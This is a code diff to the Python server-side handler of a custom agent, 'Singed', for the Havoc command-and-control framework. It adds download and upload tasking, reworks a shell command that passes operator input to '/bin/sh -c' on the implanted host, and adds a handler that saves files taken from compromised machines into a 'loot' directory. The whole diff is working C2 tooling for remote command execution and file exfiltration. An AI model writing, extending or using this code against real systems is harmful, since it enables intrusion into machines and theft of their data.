@@ -3,27 +3,31 @@ from havoc.service import HavocService
 from havoc.agent import *
 
 import os
+import uuid
 
 COMMAND_REGISTER         = 0x100
 COMMAND_GET_JOB          = 0x101
 COMMAND_NO_JOB           = 0x102
+COMMAND_DOWNLOAD         = 0x150
+COMMAND_UPLOAD           = 0x151
 COMMAND_SHELL            = 0x152
 COMMAND_CD               = 0x153
 COMMAND_EXIT             = 0x155
 COMMAND_OUTPUT           = 0x200
+COMMAND_FILE             = 0x201
 
 # ====================
 # ===== Commands =====
 # ====================
-class CommandShell(Command):
-    CommandId = COMMAND_SHELL
-    Name = "shell"
-    Description = "executes shell commands"
+class CommandDownload(Command):
+    CommandId = COMMAND_DOWNLOAD
+    Name = "download"
+    Description = "downloads remote file"
     Help = ""
     NeedAdmin = False
     Params = [
         CommandParam(
-            name="commands",
+            name="filename",
             is_file_path=False,
             is_optional=False
         )
@@ -34,7 +38,58 @@ class CommandShell(Command):
         Task = Packer()
 
         Task.add_int( self.CommandId )
-        Task.add_data( "/bin/sh -c " + arguments[ 'commands' ] )
+        Task.add_data( arguments[ 'filename' ] )
+
+        return Task.buffer
+
+
+class CommandUpload(Command):
+    CommandId = COMMAND_UPLOAD
+    Name = "upload"
+    Description = "uploads local file"
+    Help = ""
+    NeedAdmin = False
+    Params = [
+        CommandParam(
+            name="filename",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+    Mitr = []
+
+    def job_generate( self, arguments: dict ) -> bytes:
+        Task = Packer()
+
+        Task.add_int( self.CommandId )
+
+        with open(arguments["filename"][:-1], "rb") as f:
+            file_bytes = f.read()
+            Task.add_data(file_bytes)
+    
+        Task.add_data( arguments[ 'filename' ] )
+        return Task.buffer
+
+class CommandShell(Command):
+    CommandId = COMMAND_SHELL
+    Name = "shell"
+    Description = "executes shell commands"
+    Help = ""
+    NeedAdmin = False
+    Params = [
+        CommandParam(
+            name="command",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+    Mitr = []
+
+    def job_generate( self, arguments: dict ) -> bytes:
+        Task = Packer()
+
+        Task.add_int( self.CommandId )
+        Task.add_data( "/bin/sh -c " + arguments[ 'command' ] )
 
         return Task.buffer
 
@@ -46,7 +101,7 @@ class CommandCd(Command):
     NeedAdmin = False
     Params = [
         CommandParam(
-            name="commands",
+            name="directory",
             is_file_path=False,
             is_optional=False
         )
@@ -57,7 +112,7 @@ class CommandCd(Command):
         Task = Packer()
 
         Task.add_int( self.CommandId )
-        Task.add_data( arguments[ 'commands' ] )
+        Task.add_data( arguments[ 'directory' ] )
 
         return Task.buffer
 
@@ -107,6 +162,8 @@ class Singed(AgentType):
     }
 
     Commands = [
+        CommandDownload(),
+        CommandUpload(),
         CommandShell(),
         CommandCd(),
         CommandExit(),
@@ -209,6 +266,19 @@ class Singed(AgentType):
                 print( "[*] Output: \n" + Output )
 
                 self.console_message( AgentID, "Good", "Received Output:", Output )
+
+            elif Command == COMMAND_FILE:
+                print( "[*] received downloaded file")
+
+                Output = response_parser.parse_bytes()
+
+                os.makedirs("loot", exist_ok=True)
+                
+                filename = f"loot/agent_{AgentID}-{uuid.uuid4()}"
+                with open(filename, "wb") as f:
+                    f.write(Output)
+
+                self.console_message( AgentID, "Good", f"Received uploaded file. Content written to {filename}", "")
 
             else:
                 self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )
